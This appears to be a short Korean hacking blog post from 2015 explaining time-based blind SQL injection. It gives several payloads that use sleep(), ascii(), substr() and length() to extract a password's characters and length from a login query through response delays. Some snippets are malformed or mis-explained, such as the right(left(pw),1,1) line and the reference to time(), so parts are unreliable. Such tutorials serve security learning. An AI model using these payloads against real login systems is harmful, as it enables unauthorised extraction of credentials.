---
layout: post
title: Time Base SQL Injection
date: 2015-08-24 13:43:00 +0900
category: Hacking 
---

Time Based SQL Injection은 말 그대로 시간을 이용한 공격이다.

왠만한 Blind SQL Injection을 했을때 결과가 참인지 거짓인지 알수 없을때 이 방법을 시도 해보는것도 좋다.

주로 time()함수와 benchmark()함수가 이용된다.



```
select * from user id='admin' and pw=' ' and if(ascii(substr(pw,1,1))<=120,sleep(3),0)#';
```


이 함수는 pw의 첫번째 문자가 아스키값 120이하라면 sleep 함수를 통해 3초동안 쉬는 공격 구문이다.

if()함수가 막히면 이렇게도 할 수 있다.
```
select * from user id='admin' and pw=' ' and sleep(ascii(substr(pw,1,1)))#';
```
pw의 첫번째 문자의 아스키 값만큼 시간을 지연시킨다. 물론 효율적인 공격 코드를 짜기 위해서 시간을 빼거나 나누어 주면 된다.



만약 substr()과 if()함수가 막혔다면 이렇게도 할 수 있다.


```
select * from user id='admin' and pw=' ' or (sleep(right(left(pw),1,1)))#';
```

이렇게 된다면 pw의 길이만큼 시간을 지연시킨다.
```
select * from user id='admin' and pw=' ' or (sleep(length(pw)))#';
```


공격을 하기전에 미리 길이를 알아놓을떄 편하다.



물론 이 글도 기억나는 대로 추가하겠습니다.



